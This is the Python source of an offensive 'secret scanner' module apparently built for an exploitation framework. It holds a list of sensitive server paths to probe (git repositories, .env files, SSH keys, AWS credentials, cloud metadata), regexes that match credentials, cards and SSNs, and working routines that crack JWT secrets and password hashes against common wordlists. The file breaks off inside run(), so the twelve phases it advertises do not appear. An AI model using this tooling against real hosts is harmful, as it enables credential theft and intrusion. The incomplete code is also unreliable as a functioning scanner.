"""
Secret Scanner ELITE — Ultimate Sensitive Data Discovery

The most powerful secret scanner with 12 attack phases:
Phase 1:  Sensitive path discovery (100+ paths)
Phase 2:  Git/SVN/Mercurial repository exploitation
Phase 3:  Cloud metadata extraction (AWS/GCP/Azure)
Phase 4:  CORS/WebDAV/Security header misconfiguration
Phase 5:  Backup file and source code disclosure
Phase 6:  JavaScript deep analysis (source maps, webpack, eval patterns)
Phase 7:  GraphQL introspection & API endpoint discovery
Phase 8:  Error page & debug endpoint analysis
Phase 9:  WebSocket & hidden service detection
Phase 10: JWT analysis with key confusion attack & secret cracking
Phase 11: Hash cracking (MD5/SHA1/SHA256/NTLM/bcrypt/MySQL)
Phase 12: Real-time secret extraction with severity scoring

Detects: passwords, API keys, private keys, SSH, JWT, hashes, emails,
          cloud credentials, tokens, connection strings, debug info,
          source code leaks, GraphQL schemas, WebSocket endpoints,
          admin panels, hidden services, and more.
"""

import re
import hashlib
import base64
import json
import time
import hmac
import urllib.request
import ssl as ssl_mod
from urllib.parse import urljoin, urlparse, parse_qs, unquote
from webforg.core.module import BaseAuxiliaryModule, Option
from concurrent.futures import ThreadPoolExecutor, as_completed


# ============================================================================
# COMPREHENSIVE SENSITIVE PATHS DATABASE (200+ paths)
# ============================================================================
SENSITIVE_PATHS = [
    # Version Control
    "/.git/HEAD", "/.git/config", "/.git/index", "/.git/logs/HEAD",
    "/.git/description", "/.git/packed-refs", "/.git/refs/heads/main",
    "/.git/refs/heads/master", "/.git/refs/heads/develop",
    "/.svn/entries", "/.svn/wc.db", "/.svn/all-wcprops",
    "/.hg/store/00manifest.i", "/.hg/hgrc", "/.hgignore",
    "/.bzr/README", "/.bzr/branchformat",

    # Environment & Config
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.env.dev", "/.env.staging", "/.env.test", "/.env.old",
    "/.env.save", "/.env.bak", "/.env.dist", "/.env.sample",
    "/config.php", "/configuration.php", "/settings.php",
    "/config.yml", "/config.yaml", "/config.json", "/config.ini",
    "/config.xml", "/config.toml", "/config.js",
    "/application.properties", "/application.yml", "/application.json",
    "/web.config", "/app.config", "/settings.json", "/local.settings.json",
    "/wp-config.php.bak", "/config.php.bak", "/.config",

    # Database
    "/backup.sql", "/database.sql", "/db.sql", "/dump.sql",
    "/backup.sql.gz", "/database.sql.gz", "/db.sql.gz",
    "/backup.zip", "/backup.tar.gz", "/site.zip", "/www.zip",
    "/backup.rar", "/backup.7z", "/archive.zip", "/data.zip",
    "/db_backup.sql", "/mysql_backup.sql", "/postgres_backup.sql",
    "/sqlite.db", "/database.db", "/app.db", "/users.db",

    # Debug & Logs
    "/debug", "/debug.log", "/error.log", "/access.log",
    "/app.log", "/application.log", "/server.log",
    "/phpinfo.php", "/info.php", "/test.php", "/php.ini",
    "/server-status", "/server-info", "/server-info.php",
    "/.debug", "/debug/default", "/debug/default/view",

    # API Discovery
    "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/wp-json/wp/v2/users", "/wp-json/", "/wp-json/wp/v2/",
    "/api/", "/api/v1/", "/api/v2/", "/api/v3/", "/api/v4/",
    "/graphql", "/graphql/console", "/graphiql",
    "/swagger.json", "/swagger-ui/", "/api-docs",
    "/openapi.json", "/openapi.yaml", "/swagger.yaml",
    "/redoc", "/docs", "/documentation",

    # Package Managers
    "/composer.json", "/composer.lock", "/composer.phar",
    "/package.json", "/package-lock.json", "/yarn.lock",
    "/Gemfile", "/Gemfile.lock", "/Rakefile",
    "/requirements.txt", "/Pipfile", "/Pipfile.lock",
    "/go.sum", "/go.mod", "/Cargo.toml", "/Cargo.lock",
    "/pom.xml", "/build.gradle", "/build.gradle.kts",
    "/.npmrc", "/.yarnrc", "/.babelrc", "/.eslintrc",
    "/tsconfig.json", "/webpack.config.js", "/vite.config.js",
    "/rollup.config.js", "/next.config.js", "/nuxt.config.js",

    # Docker & CI/CD
    "/docker-compose.yml", "/docker-compose.yaml", "/Dockerfile",
    "/.dockerignore", "/.gitlab-ci.yml", "/.travis.yml",
    "/Jenkinsfile", "/.circleci/config.yml", "/.github/workflows/",
    "/Vagrantfile", "/Procfile", "/appveyor.yml",
    "/bitbucket-pipelines.yml", "/buildspec.yml",

    # SSH & Keys
    "/.ssh/id_rsa", "/.ssh/id_ed25519", "/.ssh/id_dsa",
    "/.ssh/id_ecdsa", "/.ssh/authorized_keys", "/.ssh/known_hosts",
    "/id_rsa", "/id_ed25519", "/id_dsa", "/id_ecdsa",
    "/.gnupg/", "/.gpg/", "/private.key",

    # Admin Panels
    "/admin/", "/administrator/", "/admin.php", "/admin.html",
    "/cpanel/", "/webmail/", "/phpmyadmin/", "/pma/",
    "/adminer.php", "/adminer/", "/dbadmin/",
    "/wp-admin/", "/wp-login.php", "/wp-admin/install.php",
    "/joomla/administrator/", "/drupal/user/login",
    "/magento/admin/", "/admin/login", "/admin/dashboard",

    # Cloud & DevOps
    "/.aws/credentials", "/.aws/config", "/.aws/",
    "/firebase.json", "/.firebaserc", "/firebaseConfig.js",
    "/.azure/", "/.gcp/", "/service-account.json",
    "/credentials.json", "/key.json", "/secret.json", "/token.json",
    "/metadata.google.internal/", "/169.254.169.254/",

    # Common Source Paths
    "/src/", "/source/", "/app/", "/web/", "/public/",
    "/private/", "/internal/", "/dist/", "/build/",
    "/vendor/", "/node_modules/", "/bower_components/",
    "/.cache/", "/tmp/", "/temp/", "/var/",

    # Backup Extensions
    "/index.php.bak", "/index.php.old", "/index.php.orig",
    "/index.php.save", "/index.php~", "/index.php.swp",
    "/.htaccess.bak", "/.htpasswd.bak",
    "/web.config.bak", "/robots.txt.bak",

    # Actuator (Spring Boot)
    "/actuator", "/actuator/env", "/actuator/beans",
    "/actuator/configprops", "/actuator/mappings",
    "/actuator/health", "/actuator/info", "/actuator/trace",

    # Misc Sensitive
    "/.DS_Store", "/Thumbs.db", "/ehthumbs.db",
    "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF",
    "/WEB-INF/classes/", "/WEB-INF/lib/",
    "/.gitkeep", "/.gitattributes", "/.editorconfig",
    "/LICENSE", "/README.md", "/CHANGELOG.md",
]

# JavaScript file paths
JS_PATHS = [
    "/static/js/main.js", "/static/js/app.js", "/static/js/bundle.js",
    "/static/js/chunk.js", "/static/js/vendor.js", "/static/js/runtime.js",
    "/assets/js/app.js", "/assets/js/main.js", "/assets/js/config.js",
    "/dist/bundle.js", "/dist/js/app.js", "/dist/js/main.js",
    "/build/static/js/main.js",
    "/js/app.js", "/js/main.js", "/js/config.js", "/js/init.js",
    "/wp-includes/js/jquery/jquery.min.js",
    "/wp-content/themes/*/js/custom.js",
    "/wp-content/plugins/*/js/*.js",
    "/static/js/polyfill.js", "/static/js/manifest.js",
]

# Backup file extensions
BACKUP_EXTENSIONS = [
    ".bak", ".old", ".orig", ".save", ".swp", ".tmp",
    ".backup", ".copy", ".dist", ".sav", ".swx",
    ".sql.gz", ".sql.bak", ".sql.old", ".sql.dump",
    ".zip", ".tar.gz", ".tar.bz2", ".rar", ".7z", ".tgz",
    ".dump", ".export", ".snapshot", ".bak.sql",
]

# ============================================================================
# COMPREHENSIVE REGEX PATTERNS (50+ patterns)
# ============================================================================
PATTERNS = {
    # === CREDENTIALS & SECRETS ===
    "password": re.compile(
        r'(?i)(?:password|passwd|pwd|pass|secret|token|api_?key|access_?key|auth_?token|credentials?|db_pass|db_password)\s*[=:]\s*["\']([^"\'\s]{3,50})["\']',
        re.MULTILINE
    ),
    "hardcoded_password": re.compile(
        r'(?i)(?:var|let|const|self\.|this\.)\s*(?:password|passwd|pwd|secret|token|apikey|api_key|access_key)\s*=\s*["\']([^"\']{3,})["\']',
        re.MULTILINE
    ),
    "env_password": re.compile(
        r'(?i)(?:DB_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD|REDIS_PASSWORD|MONGO_PASSWORD|APP_SECRET|SECRET_KEY)\s*=\s*["\']?([^\s"\']{3,})["\']?',
        re.MULTILINE
    ),

    # === PRIVATE KEYS ===
    "private_key_block": re.compile(
        r'-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |SSH )?PRIVATE KEY-----[^-]+-----END (?:RSA |EC |DSA |OPENSSH |PGP |SSH )?PRIVATE KEY-----',
        re.DOTALL
    ),
    "rsa_key": re.compile(r'-----BEGIN RSA PRIVATE KEY-----[^-]+-----END RSA PRIVATE KEY-----', re.DOTALL),
    "ed25519_key": re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----[^-]+-----END OPENSSH PRIVATE KEY-----', re.DOTALL),
    "dsa_key": re.compile(r'-----BEGIN DSA PRIVATE KEY-----[^-]+-----END DSA PRIVATE KEY-----', re.DOTALL),
    "ec_key": re.compile(r'-----BEGIN EC PRIVATE KEY-----[^-]+-----END EC PRIVATE KEY-----', re.DOTALL),
    "pgp_key": re.compile(r'-----BEGIN PGP (?:PRIVATE )?KEY BLOCK-----[^-]+-----END PGP (?:PRIVATE )?KEY BLOCK-----', re.DOTALL),
    "ssh_public_key": re.compile(r'ssh-(?:rsa|ed25519|dss|ecdsa) [A-Za-z0-9+/]{100,}'),
    "age_key": re.compile(r'AGE-SECRET-KEY-[A-Z0-9]+'),

    # === HASHES ===
    "md5_hash": re.compile(r'\b([a-fA-F0-9]{32})\b'),
    "sha1_hash": re.compile(r'\b([a-fA-F0-9]{40})\b'),
    "sha256_hash": re.compile(r'\b([a-fA-F0-9]{64})\b'),
    "sha512_hash": re.compile(r'\b([a-fA-F0-9]{128})\b'),
    "bcrypt_hash": re.compile(r'\$2[aby]\$\d{2}\$[A-Za-z0-9./]{53}'),
    "ntlm_hash": re.compile(r'\b([a-fA-F0-9]{32}:[a-fA-F0-9]{32})\b'),
    "mysql_hash": re.compile(r'\*[A-F0-9]{40}'),
    "django_hash": re.compile(r'\bpbkdf2_sha256\$[^\s]{80,}\b'),
    "phpass_hash": re.compile(r'\$P\$\w{34}'),
    "argon2_hash": re.compile(r'\$argon2(?:id|i|d)\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9+/=]+\$[A-Za-z0-9+/=]+'),

    # === CLOUD CREDENTIALS ===
    "aws_access_key": re.compile(r'\b(AKIA[0-9A-Z]{16})\b'),
    "aws_secret_key": re.compile(r'(?i)aws_?secret_?access_?key\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})["\']?'),
    "aws_session_token": re.compile(r'(?i)aws_?session_?token\s*[=:]\s*["\']?([A-Za-z0-9/+=]{100,})["\']?'),
    "aws_arn": re.compile(r'arn:aws:iam::\d{12}:(?:role|user)/[^\s"\']+'),
    "gcp_key": re.compile(r'"type"\s*:\s*"service_account"'),
    "azure_storage_key": re.compile(r'(?i)AccountKey=[A-Za-z0-9+/=]{88}'),
    "azure_sas": re.compile(r'(?i)\?sv=\d{4}-\d{2}-\d{2}&ss=[a-z]+&srt=[a-z]+&sp=[a-z]+&se=\d{4}'),

    # === API KEYS & TOKENS ===
    "jwt_token": re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'),
    "slack_token": re.compile(r'\bxox[baprs]-[0-9A-Za-z-]+'),
    "slack_webhook": re.compile(r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+'),
    "github_token": re.compile(r'\bgh[ps]_[A-Za-z0-9_]{36,}'),
    "github_fine_grained": re.compile(r'\bgithub_pat_[A-Za-z0-9_]{82}'),
    "github_oauth": re.compile(r'\bgho_[A-Za-z0-9_]{36,}'),
    "gitlab_token": re.compile(r'\bglpat-[A-Za-z0-9_-]{20,}'),
    "gitlab_pipeline": re.compile(r'\bglptt-[A-Za-z0-9_-]{20,}'),
    "bitbucket_token": re.compile(r'\bb[pf]_[A-Za-z0-9_]{32,}'),
    "heroku_api_key": re.compile(r'(?i)heroku[_-]?api[_-]?key\s*[=:]\s*["\']?([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})'),
    "npm_token": re.compile(r'\bnpm_[A-Za-z0-9]{36}'),
    "pypi_token": re.compile(r'\bpypi-[A-Za-z0-9_-]{60,}'),
    "digitalocean_token": re.compile(r'\bdop_v1_[a-f0-9]{64}'),
    "vault_token": re.compile(r'\bhvs\.[A-Za-z0-9]{24,}'),
    "sendgrid_key": re.compile(r'\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'),
    "stripe_key": re.compile(r'\b(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}'),
    "twilio_key": re.compile(r'\bSK[0-9a-fA-F]{32}'),
    "google_api_key": re.compile(r'\bAIza[0-9A-Za-z_-]{35}'),
    "google_oauth": re.compile(r'\b[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com'),
    "firebase_key": re.compile(r'\bAAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}'),
    "telegram_token": re.compile(r'\b\d{9,10}:[A-Za-z0-9_-]{35}'),
    "discord_token": re.compile(r'[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27,}'),
    "discord_webhook": re.compile(r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+'),
    "shopify_token": re.compile(r'\bshpat_[a-fA-F0-9]{32}'),
    "square_token": re.compile(r'\bsq0(?:atp|csp)-[A-Za-z0-9_-]{22,}'),
    "paypal_token": re.compile(r'\bA[A-Za-z0-9_-]{35,}'),
    "heroku_oauth": re.compile(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'),

    # === CONTACT INFO ===
    "email": re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
    "phone_us": re.compile(r'(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}'),
    "phone_intl": re.compile(r'\+\d{1,3}[-.\s]?\d{4,14}'),
    "credit_card": re.compile(r'\b(?:\d[ -]*?){13,16}\b'),
    "ssn": re.compile(r'\b\d{3}[-.\s]?\d{2}[-.\s]?\d{4}\b'),
    "iban": re.compile(r'\b[A-Z]{2}\d{2}[A-Z0-9]{4,30}\b'),

    # === NETWORK ===
    "ip_address": re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b'),
    "ipv6_address": re.compile(r'(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}'),
    "internal_url": re.compile(r'https?://(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)[^\s"\']+'),
    "metadata_url": re.compile(r'https?://169\.254\.169\.254[^\s"\']+'),

    # === ENCODED DATA ===
    "base64_long": re.compile(r'[A-Za-z0-9+/]{50,}={0,2}'),
    "base64_jwt": re.compile(r'eyJ[A-Za-z0-9+/=]{20,}'),
    "hex_string": re.compile(r'(?:(?:0x)?[0-9a-fA-F]{2}(?:[:, ]|$)){8,}'),
    "url_encoded": re.compile(r'(?:%[0-9A-Fa-f]{2}){5,}'),

    # === CODE PATTERNS ===
    "internal_path": re.compile(r'(?:/var/www|/home/|/usr/local|/opt/|/etc/|/srv/|/app/)[^\s"\'<>]{5,}'),
    "debug_endpoint": re.compile(r'(?i)/(?:debug|trace|actuator|metrics|prometheus|health|info|env)(?:/|$)'),
    "source_comment_secret": re.compile(
        r'(?i)(?:TODO|FIXME|HACK|XXX|BUG|SECRET|PASSWORD|CREDENTIAL|APIKEY)\s*[:=]\s*(.{5,100})',
        re.MULTILINE
    ),
    "eval_usage": re.compile(r'\beval\s*\(\s*(?:atob|btoa|Buffer\.from|unescape|decodeURIComponent)'),
    "dangerous_function": re.compile(r'(?i)(?:exec|system|passthru|shell_exec|popen|proc_open)\s*\('),
    "sql_query": re.compile(r'(?i)(?:SELECT|INSERT|UPDATE|DELETE)\s+.+\s+FROM\s+\w+'),
    "file_read": re.compile(r'(?i)(?:file_get_contents|fopen|readfile|include|require|require_once)\s*\(\s*["\']'),

    # === WEB-SPECIFIC ===
    "meta_secret": re.compile(r'<meta\s+[^>]*(?:secret|key|token|password)[^>]*content=["\']([^"\']+)["\']', re.I),
    "hidden_input": re.compile(r'<input\s+[^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']+)["\']', re.I),
    "html_comment_secret": re.compile(r'<!--[^>]*(?:password|secret|key|token|admin|debug)[^>]*-->', re.I),
    "form_action": re.compile(r'<form[^>]*action=["\']([^"\']+)["\']', re.I),
    "iframe_src": re.compile(r'<iframe[^>]*src=["\']([^"\']+)["\']', re.I),

    # === CONNECTION STRINGS ===
    "connection_string": re.compile(
        r'(?i)(?:mysql|postgres|postgresql|mongodb|redis|amqp|smtp|mssql|oracle|sqlite)://[^\s"\'<>]{10,}'
    ),
    "database_url": re.compile(
        r'(?i)(?:DB|DATABASE|MYSQL|POSTGRES|MONGO|REDIS)[_-]?(?:URL|URI|HOST|CONNECTION|DSN)\s*[=:]\s*["\']?([^\s"\'<>]{10,})["\']?'
    ),
    "dsn_string": re.compile(r'(?i)DSN=[^\s;]+;'),
}


# ============================================================================
# SEVERITY MAPPING (single source of truth for every finding type)
# ============================================================================
SEVERITY_MAP = {
    "private_key": "CRITICAL", "rsa_key": "CRITICAL", "dsa_key": "CRITICAL", "ec_key": "CRITICAL",
    "pgp_key": "CRITICAL", "ed25519_key": "CRITICAL", "age_key": "CRITICAL",
    "password": "HIGH", "hardcoded_password": "HIGH", "env_password": "HIGH",
    "aws_access_key": "CRITICAL", "aws_secret_key": "CRITICAL", "aws_session_token": "CRITICAL",
    "aws_arn": "MEDIUM",
    "azure_storage_key": "CRITICAL", "azure_sas": "CRITICAL",
    "gcp_key": "CRITICAL",
    "jwt_token": "MEDIUM", "jwt_CRACKED": "CRITICAL", "jwt_ALG_NONE": "CRITICAL",
    "slack_token": "HIGH", "slack_webhook": "HIGH", "github_token": "HIGH",
    "github_fine_grained": "CRITICAL", "github_oauth": "HIGH",
    "gitlab_token": "HIGH", "gitlab_pipeline": "HIGH", "bitbucket_token": "HIGH",
    "npm_token": "HIGH", "pypi_token": "HIGH", "digitalocean_token": "HIGH",
    "vault_token": "HIGH", "sendgrid_key": "HIGH", "stripe_key": "CRITICAL",
    "google_api_key": "MEDIUM", "google_oauth": "MEDIUM", "firebase_key": "HIGH",
    "telegram_token": "HIGH", "discord_token": "HIGH", "discord_webhook": "HIGH",
    "shopify_token": "HIGH", "heroku_api_key": "HIGH", "heroku_oauth": "MEDIUM",
    "twilio_key": "HIGH", "square_token": "HIGH", "paypal_token": "MEDIUM",
    "connection_string": "HIGH", "database_url": "HIGH", "dsn_string": "MEDIUM",
    "ssh_public_key": "MEDIUM",
    "email": "INFO", "phone_us": "INFO", "phone_intl": "INFO",
    "credit_card": "CRITICAL", "ssn": "CRITICAL", "iban": "HIGH",
    "header_leak": "MEDIUM", "cookie_session": "MEDIUM",
    "vcs_exposed": "CRITICAL", "cloud_metadata": "CRITICAL",
    "cors_misconfig": "HIGH", "webdav_enabled": "HIGH",
    "backup_file": "HIGH", "debug_endpoint": "HIGH",
    "error_info_leak": "MEDIUM", "path_traversal": "CRITICAL",
    "source_map": "MEDIUM", "graphql_introspection": "MEDIUM",
    "graphql_sensitive_types": "HIGH", "websocket": "MEDIUM",
    "jwks_endpoint": "INFO", "auth_header_leak": "HIGH",
    "missing_security_headers": "LOW", "hidden_input": "MEDIUM",
    "html_comment_secret": "LOW", "meta_secret": "MEDIUM",
    "eval_usage": "HIGH", "dangerous_function": "HIGH",
    "sql_query": "MEDIUM", "file_read": "MEDIUM",
    "md5_hash": "INFO", "sha1_hash": "INFO", "sha256_hash": "INFO", "sha512_hash": "INFO",
    "md5_CRACKED": "HIGH", "sha1_CRACKED": "HIGH", "sha256_CRACKED": "HIGH", "sha512_CRACKED": "HIGH",
    "ntlm_hash": "CRITICAL", "mysql_hash": "HIGH",
    "base64_decoded": "MEDIUM",
    "internal_url": "MEDIUM", "metadata_url": "CRITICAL",
}

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}


def _severity_for(finding_type: str) -> str:
    return SEVERITY_MAP.get(finding_type, "INFO")


# ============================================================================
# JWT ELITE FUNCTIONS
# ============================================================================
def decode_jwt(token: str) -> dict | None:
    """Decode and deeply analyze a JWT token."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None

        header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))

        payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))

        alg = header.get("alg", "unknown")
        kid = header.get("kid", "")
        typ = header.get("typ", "JWT")

        result = {
            "header": header,
            "payload": payload,
            "algorithm": alg,
            "kid": kid,
            "typ": typ,
            "vulnerabilities": [],
            "secrets_in_payload": [],
            "sensitive_claims": [],
        }

        # Algorithm analysis
        if alg.lower() == "none":
            result["vulnerabilities"].append("CRITICAL: alg=none — signature bypass possible!")
        elif alg.lower() in ("hs256", "hs384", "hs512"):
            result["vulnerabilities"].append("WARNING: Symmetric algorithm — brute forceable with weak secret")
        elif alg.lower() in ("rs256", "rs384", "rs512"):
            result["info"] = "RSA asymmetric algorithm"
            result["vulnerabilities"].append("INFO: Check for key confusion attack (RS256→HS256)")

        # Expiration analysis
        exp = payload.get("exp")
        nbf = payload.get("nbf")
        iat = payload.get("iat")
        now = time.time()

        if exp:
            if exp < now:
                result["vulnerabilities"].append("INFO: Token is EXPIRED")
            else:
                remaining = exp - now
                if remaining > 86400 * 365 * 10:
                    result["vulnerabilities"].append("WARNING: Extremely long expiration (>10 years)")
                elif remaining > 86400 * 365:
                    result["vulnerabilities"].append("WARNING: Very long expiration (>1 year)")

        if nbf and nbf > now + 3600:
            result["vulnerabilities"].append("WARNING: nbf is in the future")

        # Sensitive claims extraction
        sensitive_patterns = {
            "password": ["password", "passwd", "pwd", "pass", "secret"],
            "credential": ["credential", "credentials", "auth", "token", "api_key", "apikey"],
            "admin": ["admin", "is_admin", "isadmin", "role", "privilege", "permissions"],
            "user": ["sub", "user_id", "userid", "email", "username", "name", "phone"],
            "financial": ["credit_card", "card", "payment", "balance", "amount"],
        }

        for claim, value in payload.items():
            claim_lower = claim.lower()
            for category, keywords in sensitive_patterns.items():
                if any(k in claim_lower for k in keywords):
                    result["secrets_in_payload"].append(f"{claim}: {value}")
                    result["sensitive_claims"].append(claim)

        # Check for missing critical claims
        if "iss" not in payload:
            result["vulnerabilities"].append("INFO: Missing 'iss' claim")
        if "aud" not in payload:
            result["vulnerabilities"].append("INFO: Missing 'aud' claim")

        return result
    except Exception:
        return None


def crack_jwt_secret(token: str, wordlist: list[str] | None = None) -> str | None:
    """Crack JWT HMAC secret with comprehensive wordlist."""
    if wordlist is None:
        wordlist = [
            # Common secrets
            "secret", "password", "123456", "jwt_secret", "key",
            "supersecret", "changeme", "default", "admin", "test",
            "your-256-bit-secret", "shhhhh", "keyboard cat",
            # Framework defaults
            "JWT_SECRET", "jwt-secret", "jwtSecret",
            "my-secret", "mySecret", "MySecret",
            "your-secret-here", "please-change-this",
            "secret-key", "secretKey", "SecretKey",
            # Common patterns
            "abcdef", "xyz123", "qwerty", "letmein", "welcome",
            "monkey", "dragon", "master", "login", "abc123",
            "password1", "admin123", "root", "toor", "pass",
            "test", "guest", "1234", "12345", "123456789",
            # Development
            "dev", "development", "staging", "production",
            "local", "localhost", "debug", "sample",
            # JWT specific
            "HS256-secret", "signing-key", "signingKey",
            "jwtSigningSecret", "tokenSecret", "token-secret",
        ]

    parts = token.split(".")
    if len(parts) != 3:
        return None

    header_b64 = parts[0]
    payload_b64 = parts[1]
    sig_padded = parts[2] + "=" * (4 - len(parts[2]) % 4)

    try:
        signature = base64.urlsafe_b64decode(sig_padded)
    except Exception:
        return None

    header_padded = header_b64 + "=" * (4 - len(header_b64) % 4)
    try:
        header = json.loads(base64.urlsafe_b64decode(header_padded))
    except Exception:
        return None

    alg = header.get("alg", "")
    if not alg.startswith("HS"):
        return None

    hash_func = hashlib.sha256
    if alg == "HS384":
        hash_func = hashlib.sha384
    elif alg == "HS512":
        hash_func = hashlib.sha512

    data = f"{header_b64}.{payload_b64}".encode()
    for secret in wordlist:
        try:
            expected = hmac.new(secret.encode(), data, hash_func).digest()
            if hmac.compare_digest(expected, signature):
                return secret
        except Exception:
            continue
    return None


# ============================================================================
# HASH CRACKING ENGINE
# ============================================================================
COMMON_PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "monkey", "master", "dragon", "111111", "baseball",
    "iloveyou", "trustno1", "sunshine", "princess", "football",
    "charlie", "shadow", "michael", "password1", "admin",
    "admin123", "root", "toor", "pass", "test", "guest",
    "1234", "12345", "123456789", "1234567890", "letmein",
    "welcome", "hello", "qwerty123", "master123", "login",
    "passw0rd", "1q2w3e4r", "000000", "121212",
    "summer", "winter", "spring", "fall", "january",
    "michael1", "jennifer", "jordan", "thomas", "joshua",
    "hunter2", "mustang", "access", "love", "secret",
    "superman", "iloveu", "password!", "p@ssword", "p@ss123",
    "admin!", "root123", "changeme", "default", "system",
]


def crack_md5(h: str) -> str | None:
    for pwd in COMMON_PASSWORDS:
        if hashlib.md5(pwd.encode()).hexdigest() == h.lower():
            return pwd
    return None


def crack_sha1(h: str) -> str | None:
    for pwd in COMMON_PASSWORDS:
        if hashlib.sha1(pwd.encode()).hexdigest() == h.lower():
            return pwd
    return None


def crack_sha256(h: str) -> str | None:
    for pwd in COMMON_PASSWORDS:
        if hashlib.sha256(pwd.encode()).hexdigest() == h.lower():
            return pwd
    return None


def analyze_hash(h: str) -> dict:
    h = h.lower()
    result = {"hash": h, "type": "unknown", "cracked": None, "length": len(h)}
    if len(h) == 32 and ":" not in h:
        result["type"] = "MD5"
        result["cracked"] = crack_md5(h)
    elif len(h) == 40 and not h.startswith("*"):
        result["type"] = "SHA1"
        result["cracked"] = crack_sha1(h)
    elif len(h) == 64:
        result["type"] = "SHA256"
        result["cracked"] = crack_sha256(h)
    elif len(h) == 128:
        result["type"] = "SHA512"
    elif ":" in h:
        parts = h.split(":")
        if len(parts) == 2 and len(parts[0]) == 32 and len(parts[1]) == 32:
            result["type"] = "NTLM"
    elif h.startswith("*") and len(h) == 41:
        result["type"] = "MySQL4.1+"
    elif h.startswith("$2"):
        result["type"] = "bcrypt"
    elif h.startswith("$pbkdf2"):
        result["type"] = "PBKDF2"
    elif h.startswith("$argon2"):
        result["type"] = "Argon2"
    return result


def decode_base64(data: str) -> str | None:
    try:
        decoded = base64.b64decode(data)
        if all(32 <= b < 127 or b in (10, 13, 9) for b in decoded[:200]):
            return decoded.decode("utf-8", "replace")
    except Exception:
        pass
    return None


# ============================================================================
# SCANNER MODULE
# ============================================================================
class Scanner(BaseAuxiliaryModule):
    """ELITE secret scanner — the most powerful sensitive data discovery tool."""

    name = "Secret Scanner ELITE — Ultimate Sensitive Data Discovery"
    author = "WebForge"
    severity = "INFO"
    description = "12-phase elite scanner for passwords, keys, hashes, JWT, cloud creds, and more"

    def _build_options(self):
        self.add_option("RHOSTS", Option(str, required=True, description="Target host"))
        self.add_option("RPORT", Option(int, required=False, default=443, description="Target port"))
        self.add_option("SSL", Option(bool, required=False, default=True, description="Use HTTPS"))
        self.add_option("TARGETURI", Option(str, required=False, default="/", description="Base path"))
        self.add_option("TIMEOUT", Option(int, required=False, default=10, description="HTTP timeout"))
        self.add_option("DEPTH", Option(int, required=False, default=3, description="Crawl depth"))
        self.add_option("THREADS", Option(int, required=False, default=10, description="Concurrent threads"))
        self.add_option("DECODE_BASE64", Option(bool, required=False, default=True, description="Decode base64"))
        self.add_option("CRACK_HASHES", Option(bool, required=False, default=True, description="Crack hashes"))
        self.add_option("CRACK_JWT", Option(bool, required=False, default=True, description="Crack JWT secrets"))
        self.add_option("CHECK_GIT", Option(bool, required=False, default=True, description="Exploit VCS repos"))
        self.add_option("CHECK_CLOUD", Option(bool, required=False, default=True, description="Check cloud metadata"))
        self.add_option("CHECK_CORS", Option(bool, required=False, default=True, description="Check CORS/WebDAV"))
        self.add_option("CHECK_GRAPHQL", Option(bool, required=False, default=True, description="GraphQL introspection"))
        self.add_option("CHECK_JS", Option(bool, required=False, default=True, description="Deep JS analysis"))
        self.add_option("CHECK_WEBSOCKETS", Option(bool, required=False, default=True, description="WebSocket detection"))
        self.add_option("EXCLUDE", Option(str, required=False, default="", description="Exclude patterns"))

    def run(self):
        host = self.get_option("RHOSTS")
        port = self.get_option("RPORT")
        ssl_ = self.get_option("SSL")
        path = self.get_option("TARGETURI")
        timeout = self.get_option("TIMEOUT")
        depth = self.get_option("DEPTH")
        threads = self.get_option("THREADS")
        decode_b64 = self.get_option("DECODE_BASE64")
        crack = self.get_option("CRACK_HASHES")
        crack_jwt = self.get_option("CRACK_JWT")
        check_git = self.get_option("CHECK_GIT")
        check_cloud = self.get_option("CHECK_CLOUD")
        check_cors = self.get_option("CHECK_CORS")
        check_graphql = self.get_option("CHECK_GRAPHQL")
        check_js = self.get_option("CHECK_JS")
        check_ws = self.get_option("CHECK_WEBSOCKETS")
        exclude = [x.strip().lower() for x in self.get_option("EXCLUDE").split(",") if x.strip()]

        scheme = "https" if ssl_ else "http"
        base_url = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
        base_url = base_url.rstrip("/") + path.rstrip("/")

        ctx = ssl_mod.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl_mod.CERT_NONE
